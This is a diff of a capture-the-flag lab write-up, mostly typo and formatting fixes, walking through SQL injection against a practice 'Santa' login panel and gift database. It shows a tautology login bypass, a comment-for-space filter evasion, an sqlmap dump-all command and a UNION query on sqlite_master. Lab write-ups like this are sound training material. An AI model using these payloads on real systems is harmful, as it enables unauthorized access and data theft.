@@ -4,7 +4,7 @@
 
 -----
 
-For me the ip for the machine was:`10.10.3.234` it probably be diffrent for you.
+For me the ip for the machine was: `10.10.3.234` it'll probably be diffrent for you.
 
 ## Question 1
 *Without using directory brute forcing, what's Santa's secret login panel?*
@@ -28,22 +28,23 @@ I've probably could have guest that the first time by just looking at the length
 *Visit Santa's secret login panel and bypass the login using SQLi*
 
 No answer needed
+
 I manged to bypass the login form with a simple SQLi: `' or 1=1 --`
 
-- Note:The challange suggest there's a WAF preventing spaces, but I didn't had this problem in my SQLi
-However if they do change it in the future all you need to do is replace ever space with a comment:
-
+- Note: The challange suggest there's a WAF preventing spaces, but I didn't had this problem in my SQLi
+However if they do change it in the future all you need to do is replace every space with a comment:
 `' or 1=1 --` -> `'/**/or/**/1=1/**/--`.
 
 ## Question 3
 *How many entries are there in the gift database?*
 
-again with the same SQLi as the last question: `' or 1=1 --`
+again with the same SQLi as before: `' or 1=1 --` I got all the enteries.
+
 I could easily copy the table (Not inculding the headers) into a file i.e giftdb and use `wc` to count the number of lines, like a so:
 ```bash
 cat giftdb | wc -l
 ```
-and so the output is `22`
+and so the output is: `22`
 - Note: don't forget to put a newline at the end of the last entrey, otherwise `wc` wouldn't count it as a line.
 
 ## Question 4
@@ -53,7 +54,7 @@ Because we have all the enteries, I just ran:
 ```bash
 cat giftdb | grep -i paul 
 ``` 
-and so the output is `github ownership`
+and so the output is: `github ownership`
 
 ## Question 5
 *What is the flag?*
@@ -64,7 +65,7 @@ However I will provide you with the sqlmap command which will lead you to the fl
 ```bash
 sqlmap -p search -r req --tamper=space2comment --dbms sqlite --batch --dump-all
 ```
-- The `req` file is the request I captured with Burpsuite like they should above. 
+- The `req` file is the request I captured with Burpsuite like they showed above. 
 ---
 Moving on I first tried to see if there are really only 2 columns like we can see in the website so I searched:
 ```
@@ -78,7 +79,7 @@ I entered:
 @' UNION SELECT sql,1 FROM sqlite_master WHERE type='table' --
 ```
 and got this:
-![test](/screenshots/table_names.png)
+![](/screenshots/table_names.png)
 
 so we can see there are 3 tables:
 - sequels: having a title, kid name, and age so we can understand that's the gift datebase on the website so nothing on intrest here.
